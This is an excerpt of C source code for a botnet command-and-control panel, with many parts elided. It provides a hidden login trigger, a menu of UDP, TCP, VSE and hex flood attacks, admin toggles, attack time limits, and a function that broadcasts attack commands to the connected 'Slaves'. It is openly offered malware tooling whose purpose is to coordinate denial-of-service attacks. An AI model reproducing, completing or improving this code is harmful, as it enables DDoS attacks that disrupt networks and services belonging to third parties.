...
#include "includes.h"
#define LOGINTRIGGER "letmein" //String To Trigger Login Prompt aka real hacker shit by s4y
...
static void checkmyfloods(int datafd)
{
    ...
    if(checkfloods == 0)
    {
        sprintf(botnet, "\e[0mfloods: \e[1;32mONLINE\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
    }
    
    if(checkfloods == 1)
    {
        sprintf(botnet, "\e[0mfloods: \e[1;31mOFFLINE\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
    }
}
...
void *TitleWriter(void *sock) {
        ...
        while (1) {
            ...
            sprintf(string, "%c]0; %d Slaves%c", '\033', BotsConnected(), '\007');
...
loginprompt:
    ...
    sprintf(banner1lol2, "\033[01;37mWelcome To My Botnet!\r\n");
    sprintf(banner1lol3, "\033[0m\r\n");
    ...
    while (fdgets(buf, sizeof buf, datafd) > 0) {
        ...
        sprintf(h6,  "\033[01;36mstd\033[37m: \033[0mstd flood.\r\n");
        sprintf(h7,  "\033[01;36mkillall\033[37m: \033[0mcustomized flood.\r\n");
        sprintf(space1, "\033[0m\r\n");
        sprintf(h1,  "\033[01;36mrhex\033[37m: \033[0mrandom hex flood\r\n");
        sprintf(h2,  "\033[01;36mshex\033[37m: \033[0mstd-hex (uid1 supported flood).\r\n");
        sprintf(space2, "\033[0m\r\n");
        sprintf(h3,  "\033[01;36mvse\033[37m: \033[0mvse flood (valve source engine flood).\r\n");
        sprintf(h4,  "\033[01;36mtcp\033[37m: \033[0mtcpflood (with options).\r\n");
        sprintf(h5,  "\033[01;36mplain\033[37m: \033[0mplain udp flood.\r\n");

        if (send(datafd, h6, strlen(h6), MSG_NOSIGNAL) == -1) goto end;
        if (send(datafd, h7, strlen(h7), MSG_NOSIGNAL) == -1) goto end;
        if (send(datafd, space1, strlen(space1), MSG_NOSIGNAL) == -1) goto end;
        if (send(datafd, h1, strlen(h1), MSG_NOSIGNAL) == -1) goto end;
        if (send(datafd, h2, strlen(h2), MSG_NOSIGNAL) == -1) goto end;
        if (send(datafd, space2, strlen(space2), MSG_NOSIGNAL) == -1) goto end;
        if (send(datafd, h3, strlen(h3), MSG_NOSIGNAL) == -1) goto end;
        if (send(datafd, h4, strlen(h4), MSG_NOSIGNAL) == -1) goto end;
        if (send(datafd, h5, strlen(h5), MSG_NOSIGNAL) == -1) goto end;
        }
        if (strncmp(buf, "admin", 4) == 0 || strncmp(buf, "ADMIN", 4) == 0 || strncmp(buf, "?", 1) == 0 ||
        ...
        if(strstr(buf, "love"))
        {
            sprintf(botnet, "juliana loves you bro!\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "bots"))
        {
        ...
        else if(strstr(buf, ".captcha enable") || strstr(buf, ".CAPTCHA ENABLE"))
        {
            ...
            {
                sprintf(botnet, "\e[0mlogin captcha was successfully enabled!\e[0m\r\n");
        ...
        else if(strstr(buf, ".captcha disable") || strstr(buf, ".CAPTCHA DISABLE"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                sprintf(botnet, "\e[0mlogin captcha was successfully disabled!\e[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                captcano = 0;
                }
            else
        ...
        else if(strstr(buf, ".trigger enable") || strstr(buf, ".TRIGGER ENABLE"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                sprintf(botnet, "\e[0mlogin trigger was successfully enabled!\e[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                logintrigger = 1;
                }
            else
        ...
        else if(strstr(buf, ".trigger disable") || strstr(buf, ".TRIGGER DISABLE"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                sprintf(botnet, "\e[0mlogin trigger was successfully disabled!\e[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                logintrigger = 0;
                }
            else
        ...
        else if(strstr(buf, ".flood enable") || strstr(buf, ".FLOOD ENABLE"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                sprintf(botnet, "\e[0mfloods have been temporarily enabled!\e[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                checkfloods = 0;
                }
            else
        ...
        else if(strstr(buf, ".flood disable") || strstr(buf, ".flood disable"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                sprintf(botnet, "\e[0mfloods have been temporarily disabled!\e[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                checkfloods = 1;
                }
            else
        ...
        if(strstr(buf, "check"))
            ...
            {
                char roxy[50];
                sprintf(roxy, "\e[0mfloods are temporarily disabled!\r\n");
        ...
        if(strstr(buf, "std") || strstr(buf, "rawflood") ||strstr(buf, "tcp") || strstr(buf, "plain") || strstr(buf, "vse") || strstr(buf, "shex") || strstr(buf, "rhex") || strstr(buf, "killall"))
        {
            char realbuf[1024];
            char senddata[1024];
            strcpy(realbuf, buf);
            ...
            if(time > maxtime)
            {
                sprintf(senddata, "\033[0mATTACK TIME EXCEEDED!\r\n");
                send(datafd, senddata, strlen(senddata), MSG_NOSIGNAL);
            }
            else
            {
                sprintf(botnet, "\x1b[0mattack broadcasting to %d clients\r\n", BotsConnected());
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, datafd, accounts[find_line].username);
            }
        ...
        {   
            if(XXXgements[datafd].adminstatus == 1)
            {
                ...
                for(online=0; online < MAXFDS; online++)
                {
                    ...
                    {
                        sprintf(botnet, "\x1b[37mID\e[01;37m(\e[37m%d\e[01;37m) \x1b[01;37m%s\x1b[0m\r\n", online, XXXgements[online].nickname);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                    sprintf(botnet, "\e[0mtotal online users: \e[01;37m%d\e[0m\r\n", OperatorsConnected);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }   
                else
                {
